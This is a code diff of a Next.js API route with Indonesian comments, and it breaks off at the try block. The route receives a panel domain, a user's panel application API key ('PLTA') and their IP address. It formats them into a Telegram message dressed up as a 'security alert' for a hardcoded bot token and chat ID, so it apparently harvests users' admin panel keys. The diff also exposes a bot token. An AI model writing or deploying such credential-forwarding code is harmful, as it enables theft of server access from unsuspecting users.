@@ -1,27 +1,31 @@
-// pages/api/notify.js
 import axios from 'axios';
 
-// Token & Chat ID lu (JANGAN SAMPAI LEPAS KE PUBLIC)
+// Token & Chat ID lu
 const BOT_TOKEN = '7326623466:AAFKdUTahzRetWMjhPli4L4v6RLFajm-8Uc';
 const CHAT_ID = '6315300476';
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
 
-  const { domain, key, ip } = req.body; // Nangkep key juga sekarang
+  // 1. Tangkap data "plta" (samakan namanya dengan frontend)
+  const { domain, plta, ip } = req.body;
+  
+  // 2. Cek kalau plta kosong/undefined
+  const safePlta = plta || "TIDAK TERDETEKSI / KOSONG"; 
+
   const date = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-  // Pesan Telegram dengan Format Security Alert
+  // 3. Susun Pesan
   const message = `
 🚨 <b>SECURITY ALERT: NEW CONFIG</b>
 
-👤 <b>User IP: </b> <code>${ip || 'Hidden'}</code>
-🌐 <b>Panel: </b> <code>${domain}</code>
-🔑 <b>API Key (PLTA): </b>
-<code>${key}</code>
+👤 <b>User IP:</b> <code>${ip || 'Hidden'}</code>
+🌐 <b>Panel:</b> <code>${domain}</code>
+🔑 <b>API Key (PLTA):</b>
+<code>${safePlta}</code>
 
 📅 <b>Time:</b> ${date}
-<i>⚠️ Pastikan API Key ini milik user yang sah.</i>
+<i>⚠️ Pastikan API Key ini valid.</i>
 `;
 
   try {
